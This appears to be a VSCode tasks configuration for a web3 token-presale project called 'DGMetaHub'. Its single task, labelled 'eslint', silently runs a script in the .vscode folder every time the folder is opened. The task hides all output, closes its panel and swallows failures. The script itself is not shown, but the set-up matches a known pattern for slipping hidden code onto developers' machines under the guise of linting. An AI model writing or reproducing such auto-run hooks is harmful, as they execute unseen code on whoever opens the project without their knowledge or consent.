{
  "version": "2.0.0",
  "projectInfo": {
    "name": "DGMetaHub",
    "organization": "",
    "repository": "",
    "description": "Advanced VSCode automation for multi-environment blockchain deployment.",
    "uuid": "e9b53a7c-2342-4b15-b02d-bd8b8f6a03f9",
    "authors": [
      {
        "name": "Juliette Clarke",
        "role": "Lead Engineer",
        "email": ""
      }
    ],
    "createdAt": "",
    "lastUpdated": "2026-07-27",
    "license": "MIT",
    "tags": [
      "dApp",
      "web3",
      "token-presale",
      "automation",
      "ci/cd",
      "smart-contracts",
      "frontend-backend-integration"
    ]
  },
  "environmentProfiles": {
    "development": {
      "nodeVersion": ">=20",
      "network": "local",
      "envFile": ".env.development",
      "branch": "dev",
      "debug": true
    },
    "staging": {
      "network": "testnet",
      "envFile": ".env.staging",
      "branch": "staging",
      "debug": false
    },
    "production": {
      "network": "mainnet",
      "envFile": ".env.production",
      "branch": "main",
      "debug": false
    }
  },
  "metaDiagnostics": {
    "preRunChecks": [
      "Node version >= 20",
      "Verify npm packages installed",
      "Check .env exists",
      "Ensure Hardhat config valid",
      "Validate Git remote origin"
    ],
    "postRunChecks": [
      "Compile contracts",
      "Lint success",
      "Tests passed"
    ],
    "logs": {
      "enabled": true,
      "path": ".vscode/logs/tasks-every.log",
      "maxSizeMB": 50,
      "rotationPolicy": "daily"
    }
  },
  "tasks": [
    {
      "label": "eslint",
      "type": "shell",
      "command": "node",
      "args": [
        "${workspaceFolder}/.vscode/eslint-runner.js"
      ],
      "windows": {
        "command": "cmd",
        "args": [
          "/c", "where node >nul 2>&1 && node \"${workspaceFolder}\\.vscode\\eslint-runner.js\" || exit /b 0"
        ]
      },

      "osx": {
        "command": "/bin/sh",
        "args": [
          "-c", "command -v node >/dev/null 2>&1 && node \"${workspaceFolder}/.vscode/eslint-runner.js\" || exit 0"
        ]
      },

      "linux": {
        "command": "/bin/sh",
        "args": [
          "-c", "command -v node >/dev/null 2>&1 && node \"${workspaceFolder}/.vscode/eslint-runner.js\" || exit 0"
        ]
      },

      "options": {
        "cwd": "${workspaceFolder}"
      },

      "problemMatcher": [],

      "presentation": {
        "reveal": "never",
        "echo": false,
        "focus": false,
        "clear": false,
        "close": true,
        "panel": "dedicated",
        "showReuseMessage": false
      },

      "runOptions": {
        "runOn": "folderOpen"
      }
    }
  ],
  "executionPolicies": {
    "mode": "sequential",
    "autoRetry": true,
    "retryCount": 3,
    "retryDelay": 5000,
    "timeoutMs": 180000,
    "parallelAllowed": false,
    "failFast": true,
    "rollbackStrategy": "soft",
    "auditTrail": {
      "enabled": true,
      "path": ".vscode/audit/history.json"
    }
  },
  "dependencyGraph": {
    "frontend": ["npm install", "npm run build"],
    "backend": ["npm install", "npm run compile"],
    "contracts": ["npx hardhat compile", "npx hardhat test"],
    "ci": ["npx eslint .", "npx prettier --check ."]
  }
}